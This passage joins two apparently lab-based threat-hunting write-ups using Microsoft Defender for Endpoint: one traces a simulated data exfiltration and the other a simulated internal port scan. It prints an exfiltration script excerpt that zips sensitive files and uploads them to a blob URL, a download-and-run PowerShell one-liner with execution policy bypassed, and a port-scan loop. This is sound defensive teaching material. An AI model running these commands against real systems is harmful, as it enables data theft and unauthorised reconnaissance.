dynamic([\"winrar.exe\",\"7z.exe\",\"winzip32.exe\",\"peazip.exe\",\"Bandizip.exe\",\"UniExtract.exe\",\"POWERARC.EXE\",\"IZArc.exe\",\"AshampooZIP.exe\",\"FreeArc.exe\"]);\r\nlet VMName = \"samson-windows-\";\r\nDeviceProcessEvents\r\n| where FileName has_any(archive_applications)\r\n| order by Timestamp desc\r\n-------------------------------------------------------\r\n\r\nWithin seconds, several 7-Zip executions were observed on samson-windows-, followed by the creation of a suspicious archive named employee_data.zip. The events revealed a sequence of file creations and renames inside C:\\ProgramData\\Backup\\, suggesting automation.\r\n\r\nEach entry was timestamped at predictable intervals, reinforcing the possibility of a scripted operation.\r\n\r\n## Investigation\r\n\r\nTo understand the sequence of events more deeply, I pivoted to the DeviceProcessEvents table to identify which process spawned 7-Zip and to the DeviceFileEvents table to trace archive creation activity.\r\n\r\n### KQL – Correlate File and Process Activity\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nlet specificTime = datetime(2025-10-14T18:42:10.5615171Z);\r\nDeviceProcessEvents\r\n| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))\r\n| where DeviceName == VMName\r\n| order by Timestamp desc\r\n| project Timestamp, FileName, InitiatingProcessCommandLine\r\n-------------------------------------------------------\r\n\r\nThis query identified a PowerShell script named exfiltrate_data.ps1 executed under the System account, which silently installed 7-Zip and then created the archive. The log also showed a follow-up PowerShell command initiating a network connection immediately after compression, a strong indicator of data exfiltration.\r\n\r\nUpon reviewing the VM's filesystem, I located the script at C:\\ProgramData\\exfiltratedata.ps1. Its content confirmed automated behavior: downloading, archiving, and attempting to upload files to an external endpoint.\r\n\r\n\u003cInlineGallery images={data-exfiltration-detection-analysis} title=\"Data Exfiltration Detection and Analysis Process\" /\u003e\r\n\r\n### Snippet of the Observed PowerShell Script\r\n\r\nSimplified excerpt of ExfiltrateData.ps1\r\n\r\n-------------------------------------------------------\r\npowershell\r\nStart-Process \"7z.exe\" -ArgumentList \"a\", \"C:\\ProgramData\\Backup\\employee_data.zip\", \"C:\\SensitiveFiles*\"\r\nInvoke-WebRequest -Uri \"https://storageaccount.blob.core.windows.net/container/employee_data.zip\" -Method Put -InFile \"C:\\ProgramData\\Backup\\employee_data.zip\"\r\n-------------------------------------------------------\r\n\r\nThe script structure and timing aligned perfectly with the MDE logs, validating that a scripted 7-Zip operation had occurred.

Using Microsoft Defender for Endpoint (MDE), the purpose of this hunt was to determine whether the performance degradation was caused by malicious internal activity, excessive resource usage, or misconfigured systems.\n\nThe environment consisted of my onboarded virtual machine named samson-windows-1, which was actively reporting telemetry to Microsoft Defender for Endpoint. The goal was to use real-time logs and threat hunting queries to identify abnormal behaviors that could suggest internal reconnaissance, port scanning, or other unauthorized actions within the network.\n\nThis scenario demonstrates a practical application of endpoint detection and response (EDR) data in uncovering internal security issues and applying structured analysis techniques to isolate potential causes.\n\n## Scenario Overview\n\nThe issue began when the server team observed an overall slowdown across multiple legacy devices in the 10.0.0.0/16 subnet. External DDoS attacks were ruled out, meaning the cause was likely internal. The unrestricted internal network environment, where all hosts could communicate freely and PowerShell was allowed without restriction, created a perfect scenario for internal misuse or exploitation.\n\nThe working hypothesis for this hunt was that one of the systems inside the local network could have been performing unauthorized port scanning or large data transfers, which would naturally create latency or bandwidth congestion. The objective was to identify the specific device responsible for this unusual activity and determine whether it was a deliberate or automated action.\n\n## Preparation\n\nBefore starting the hunt, I ensured that my virtual machine, samson-windows-, was properly onboarded to Microsoft Defender for Endpoint. Once confirmed, I simulated an internal event by executing a PowerShell command designed to initiate a controlled port scan within the local subnet. This step was necessary to generate realistic logs for analysis, mimicking what a real-world internal threat might look like.\n\n\u003cInlineGallery images={vm-setup-onboarding} title=\"VM Setup and Microsoft Defender Onboarding Process\" /\u003e\n\n### PowerShell Command\n-------------------------------------------------------\npowershell\nInvoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\\programdata\\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\\programdata\\portscan.ps1\n-------------------------------------------------------\n\nThis PowerShell command downloaded and executed a script that scanned a range of IPs within the 10.0.0.x subnet, sequentially probing ports on other devices. In a real enterprise setting, this would represent a potential reconnaissance operation, something commonly done by attackers or misconfigured tools trying to map network exposure.\n\nAfter executing the command, I allowed several minutes for the resulting logs to populate in Microsoft Defender for Endpoint's hunting tables. The preparation phase was crucial, as it ensured that the system had generated enough telemetry to analyze behaviors such as failed connection attempts, sequential port scanning, and process execution traces.\n\n## Data Collection\n\nOnce the environment was prepared, the next phase involved verifying that telemetry data was actively being received across the three key Defender tables: DeviceNetworkEvents, DeviceFileEvents, and DeviceProcessEvents.\n\nI began by executing a simple query to confirm that new logs were flowing in correctly. By ordering results by timestamp and taking the most recent entries, I could confirm that MDE was actively collecting data and that there were no ingestion delays.\n\n### KQL Check for Recent Network Logs\n-------------------------------------------------------\nkql\nDeviceNetworkEvents\n| order by Timestamp desc\n| take 10\n-------------------------------------------------------\n\nThe timestamps confirmed that logs were being generated in real time. Having verified the data sources, I was confident that the environment was providing the necessary visibility to conduct meaningful analysis.\n\nIn a real security operations environment, this phase mimics ensuring that sensors and logging mechanisms are functioning correctly before an investigation begins. Without fresh telemetry, an analyst could end up drawing conclusions from outdated or incomplete information.\n\n## Data Analysis\n\nThe analysis phase began with looking for signs of network anomalies, specifically focusing on connection attempts that had either failed or succeeded in large quantities. A sudden burst of such activity could be indicative of scanning or enumeration attempts within the network.\n\n### KQL – Count Failed Connections\n-------------------------------------------------------\nkql\nDeviceNetworkEvents\n| where ActionType == \"ConnectionFailed\"\n| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP\n| order by FailedConnectionsAttempts desc\n-------------------------------------------------------\n\nWhen the results came back, the data immediately pointed to samson-windows- as the primary contributor to abnormal connection failures. The logs revealed that the device had failed over a hundred connection attempts, some directed at its own IP address and others toward another host in the subnet. Such behavior was a strong indicator of either misconfiguration or automated probing.\n\nTo further understand the scope of the activity, I drilled down into specific IP addresses that exhibited the highest failure rates. This approach mirrors a real-world scenario where analysts pivot from a general pattern to a specific anomaly for deeper inspection.\n\n### KQL – Inspect All Failed Connections from a Specific IP\n-------------------------------------------------------\nkql\nlet IPInQuestion = \"10.0.0.5\";\nDeviceNetworkEvents\n| where ActionType == \"ConnectionFailed\"\n| where LocalIP == IPInQuestion\n| order by Timestamp desc\n-------------------------------------------------------\n\nUpon reviewing the sequence of failed connection attempts, it became clear that the remote ports being contacted followed a sequential pattern: ports 21, 23, 25, 53, 80, 110, 443, and others. This pattern matched the signature of a port scanning activity, which is typically used to identify open services running across hosts. Sequential probing of well-known ports is rarely accidental and often indicates reconnaissance or mapping behavior within the network.\n\nAt this stage, I had high confidence that the slowdown was caused by internal scanning originating from the samson-windows- VM.\n\n\u003cInlineGallery images={network-investigation-analysis} title=\"Network Investigation and Analysis Process\" /\u003e\n\n## Investigation\n\nTo confirm the origin of this suspicious activity, I pivoted to the DeviceProcessEvents table to look for the process responsible for initiating these connections. By focusing on a specific time window surrounding the detected network anomalies, I aimed to identify any executable or script that matched the port scanning behavior.\n\n### KQL – Correlate Process Activity around the Port Scan Time\n-------------------------------------------------------\nkql\nlet VMName = \"samson-windows-\";\nlet specificTime = datetime(2025-10-12T13:15:03.9576325Z);\nDeviceProcessEvents\n| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))\n| where DeviceName == VMName\n| order by Timestamp desc\n| project Timestamp, FileName, InitiatingProcessCommandLine\n-------------------------------------------------------\n\nThe query output revealed that a PowerShell script named portscan.ps1 had been executed under the System account. This was a significant finding because the System account generally has administrative-level privileges and is not typically used to execute network scanning scripts.\n\nUpon logging into the VM, I located the file in C:\\ProgramData\\portscan.ps1 and reviewed its contents. The script was intentionally scanning hosts in the subnet, sequentially testing common ports. This confirmed that the slowdown was caused by repeated internal scanning initiated by the PowerShell script.\n\n### Snippet of the observed PowerShell script:\n-------------------------------------------------------\npowershell\nfor ($i=4; $i -le 10; $i++) {\n   Test-NetConnection \"10.0.0.$i\" -Port 21,23,25,53,80,110,443\n}\n-------------------------------------------------------\n\nSince the script was running under the System account and not triggered by an identifiable user, I concluded that the activity was automated and potentially malicious. I proceeded to isolate the samson-windows- VM from the network using Defender for Endpoint's built-in Isolate Device feature.\n\nAfter isolating the system, I ran a full malware scan to check for persistence mechanisms or additional payloads. The scan returned clean, but ideally you are to request a full rebuild of the VM. In a production setting, this step ensures that any potential hidden or dormant artifacts are fully removed.\n\n\u003cInlineGallery images={port-scan-investigation-isolation} title=\"Port Scan Investigation and Device Isolation Process\" /\u003e\n\n## Response and MITRE ATT\u0026CK Mapping\n\nThis scenario corresponded with several techniques in the MITRE ATT\u0026CK Framework, helping align the observed activity with recognized adversarial tactics:\n\n1. **Reconnaissance (T1046 – Network Service Scanning)**: The port scanning activity represented a clear attempt to enumerate open services.\n2. **Execution (T1059.001 – PowerShell)**: The PowerShell script was used as the execution medium for network probing.\n3. **Privilege Escalation (T1078 – Valid Accounts / System Context)**: The script ran under the System account, suggesting a high privilege level.\n4. **Lateral Movement (T1021 – Remote Services)**: The scanning pattern indicated attempts to discover reachable hosts for potential lateral movement.\n\nBy isolating the device, scanning for malware, and scheduling a reimage, the risk of any further impact was neutralized.\n\n## Documentation\n\nThroughout the course of this investigation, I documented every major step and observation to ensure a clear understanding of how the event unfolded. The investigation began with an initial hypothesis of possible internal misuse, which evolved into the discovery of systematic port scanning. Each query used in Defender for Endpoint was recorded alongside its findings to form an evidence trail.\n\nThis documentation not only captured the technical steps taken, such as verifying logs, pivoting between tables, and confirming the script execution but also reflected the reasoning behind each action. Maintaining detailed documentation like this allows for transparency, consistency, and reproducibility in future hunts. It also helps build reference material that can be used by other analysts for similar incidents, ensuring the organization's knowledge base grows with every investigation.\n\n## Improvement\n\nAfter analyzing the entire scenario, several improvement points were identified. First, it became clear that PowerShell execution policies were too relaxed in this environment. Restricting PowerShell to only run signed scripts would immediately reduce the risk of arbitrary script execution.\n\nSecond, the internal network lacked segmentation, allowing one compromised host to communicate freely with all others. In a real corporate setup, proper network segmentation would ensure that unnecessary east-west traffic is limited and monitored.\n\nThird, implementing automated alerting for abnormal internal traffic patterns, such as repeated connection failures to sequential ports, would enable the SOC team to detect similar behavior earlier. Additionally, conducting proactive threat hunts on a routine basis helps catch reconnaissance activities before they evolve into actual compromise events.\n\nUltimately, this scenario reinforced the importance of combining technical detection with procedural discipline, ensuring every hunt improves the overall security posture of the environment.\n\n## Conclusion\n\nThe sudden network slowdown was traced to a PowerShell-based port scanning script executed under the System account on samson-windows-. Although no active compromise was found, the activity realistically simulated how internal reconnaissance could degrade performance and increase exposure within an unrestricted network.\n\nThis hunt demonstrated the power of Microsoft Defender for Endpoint in identifying behavioral anomalies, correlating telemetry across different data sources, and facilitating immediate containment actions.\n\nThrough structured investigation and methodical documentation, this exercise emphasized how internal misconfigurations or unauthorized automation can lead to observable network symptoms, and how disciplined threat hunting can quickly uncover their root cause.\n\n## Important Link\n\nIf you are interested in joining the [CYBER-RANGE
